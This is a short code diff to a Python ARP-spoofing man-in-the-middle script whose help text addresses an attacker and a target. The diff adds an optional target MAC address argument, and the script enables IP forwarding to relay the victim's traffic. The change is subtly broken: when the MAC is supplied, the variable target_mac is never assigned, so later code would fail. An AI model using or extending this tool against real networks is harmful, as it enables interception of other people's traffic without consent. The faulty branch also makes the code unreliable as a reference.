@@ -12,6 +12,7 @@ def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interface", dest="mitm_interface", help="Attacker's interface to execute Man-in-the-Middle (MITM) attack (i.e. eth0)")
     parser.add_argument("-t", "--target", dest="target_ip", help="Target's IP address (i.e. 10.1.1.15)")
+    parser.add_argument("-tm", "--target-mac-address", dest="target_mac", required=False, help="Target MAC address (i.e. aa:bb:cc:dd:ee:ff)")
     parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address of Target (i.e. 10.1.1.1)")
     options = parser.parse_args()
     if not options.mitm_interface:
@@ -69,8 +70,11 @@ print("[ ] Script Started.")
 print("[+] Enabling Traffic Flow..")
 subprocess.check_call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 print("[+] Enabled Traffic Flow!")
-print("[+] Querying for Target MAC Address..")
-target_mac = get_mac(options.target_ip)
+if not options.target_mac:
+    print("[+] Querying for Target MAC Address..")
+    target_mac = get_mac(options.target_ip)
+else:
+    print("[+] Specified Target MAC: " + str(options.target_mac))
 print("[+] Querying for Gateway MAC Address..")
 gateway_mac = get_mac(options.gateway_ip)
 # mitm_mac_address = mitm_mac(options.mitm_interface)
